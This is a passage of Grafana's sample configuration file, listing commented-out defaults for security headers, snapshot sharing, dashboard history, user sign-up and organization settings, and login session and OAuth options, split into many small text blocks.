# set to true if you want to allow browsers to render Grafana in a <frame>, <iframe>, <embed> or <object>. default is false.
;allow_embedding = false
```
```text
# Set to true if you want to enable http strict transport security (HSTS) response header.
```
```text
# This is only sent when HTTPS is enabled in this configuration.
```
```text
# HSTS tells browsers that the site should only be accessed using HTTPS.
;strict_transport_security = false
```
```text
# Sets how long a browser should cache HSTS. Only applied if strict_transport_security is enabled.
;strict_transport_security_max_age_seconds = 86400
```
```text
# Set to true if to enable HSTS preloading option. Only applied if strict_transport_security is enabled.
;strict_transport_security_preload = false
```
```text
# Set to true if to enable the HSTS includeSubDomains option. Only applied if strict_transport_security is enabled.
;strict_transport_security_subdomains = false
```
```text
# Set to true to enable the X-Content-Type-Options response header.
```
```text
# The X-Content-Type-Options response HTTP header is a marker used by the server to indicate that the MIME types advertised
```
```text
# in the Content-Type headers should not be changed and be followed.
;x_content_type_options = true
```
```text
# Set to true to enable the X-XSS-Protection header, which tells browsers to stop pages from loading
```
```text
# when they detect reflected cross-site scripting (XSS) attacks.
;x_xss_protection = true
```
```text
# Enable adding the Content-Security-Policy header to your requests.
```
```text
# CSP allows to control resources the user agent is allowed to load and helps prevent XSS attacks.
;content_security_policy = false
```
```text
# Set Content Security Policy template used when adding the Content-Security-Policy header to your requests.
```
```text
# $NONCE in the template includes a random nonce.
```
```text
# $ROOT_PATH is server.root_url without the protocol.
;content_security_policy_template = """script-src 'self' 'unsafe-eval' 'unsafe-inline' 'strict-dynamic' $NONCE;object-src 'none';font-src 'self';style-src 'self' 'unsafe-inline' blob:;img-src * data:;base-uri 'self';connect-src 'self' grafana.com ws://$ROOT_PATH wss://$ROOT_PATH;manifest-src 'self';media-src 'none';form-action 'self';"""

#################################### Snapshots ###########################
[snapshots]
```
```text
# snapshot sharing options
;external_enabled = true
;external_snapshot_url = https://snapshots-origin.raintank.io
;external_snapshot_name = Publish to snapshot.raintank.io
```
```text
# Set to true to enable this Grafana instance act as an external snapshot server and allow unauthenticated requests for
```
```text
# creating and deleting snapshots.
;public_mode = false
```
```text
# remove expired snapshot
;snapshot_remove_expired = true

#################################### Dashboards History ##################
[dashboards]
```
```text
# Number dashboard versions to keep (per dashboard). Default: 20, Minimum: 1
;versions_to_keep = 20
```
```text
# Minimum dashboard refresh interval. When set, this will restrict users to set the refresh interval of a dashboard lower than given interval. Per default this is 5 seconds.
```
```text
# The interval string is a possibly signed sequence of decimal numbers, followed by a unit suffix (ms, s, m, h, d), e.g. 30s or 1m.
;min_refresh_interval = 5s
```
```text
# Path to the default home dashboard. If this value is empty, then Grafana uses StaticRootPath + "dashboards/home.json"
;default_home_dashboard_path =

#################################### Users ###############################
[users]
```
```text
# disable user signup / registration
;allow_sign_up = true
```
```text
# Allow non admin users to create organizations
;allow_org_create = true
```
```text
# Set to true to automatically assign new users to the default organization (id 1)
;auto_assign_org = true
```
```text
# Set this value to automatically add new users to the provided organization (if auto_assign_org above is set to true)
;auto_assign_org_id = 1
```
```text
# Default role new users will be automatically assigned (if disabled above is set to true)
;auto_assign_org_role = Viewer
```
```text
# Require email validation before sign up completes
;verify_email_enabled = false
```
```text
# Background text for the user field on the login page
;login_hint = email or username
;password_hint = password
```
```text
# Default UI theme ("dark" or "light")
;default_theme = dark
```
```text
# Path to a custom home page. Users are only redirected to this if the default home dashboard is used. It should match a frontend route and contain a leading slash.
; home_page =
```
```text
# External user management, these options affect the organization users view
;external_manage_link_url =
;external_manage_link_name =
;external_manage_info =
```
```text
# Viewers can edit/inspect dashboard settings in the browser. But not save the dashboard.
;viewers_can_edit = false
```
```text
# Editors can administrate dashboard, folders and teams they create
;editors_can_admin = false
```
```text
# The duration in time a user invitation remains valid before expiring. This setting should be expressed as a duration. Examples: 6h (hours), 2d (days), 1w (week). Default is 24h (24 hours). The minimum supported duration is 15m (15 minutes).
;user_invite_max_lifetime_duration = 24h
```
```text
# Enter a comma-separated list of users login to hide them in the Grafana UI. These users are shown to Grafana admins and themselves.
; hidden_users =

[auth]
```
```text
# Login cookie name
;login_cookie_name = grafana_session
```
```text
# The maximum lifetime (duration) an authenticated user can be inactive before being required to login at next visit. Default is 7 days (7d). This setting should be expressed as a duration, e.g. 5m (minutes), 6h (hours), 10d (days), 2w (weeks), 1M (month). The lifetime resets at each successful token rotation.
;login_maximum_inactive_lifetime_duration =
```
```text
# The maximum lifetime (duration) an authenticated user can be logged in since login time before being required to login. Default is 30 days (30d). This setting should be expressed as a duration, e.g. 5m (minutes), 6h (hours), 10d (days), 2w (weeks), 1M (month).
;login_maximum_lifetime_duration =
```
```text
# How often should auth tokens be rotated for authenticated users when being active. The default is each 10 minutes.
;token_rotation_interval_minutes = 10
```
```text
# Set to true to disable (hide) the login form, useful if you use OAuth, defaults to false
;disable_login_form = false
```
```text
# Set to true to disable the sign out link in the side menu. Useful if you use auth.proxy or auth.jwt, defaults to false
;disable_signout_menu = false
```
```text
# URL to redirect the user to after sign out
;signout_redirect_url =
```
```text
# Set to true to attempt login with OAuth automatically, skipping the login screen.
```
```text
# This setting is ignored if multiple OAuth providers are configured.
;oauth_auto_login = false
```
```text
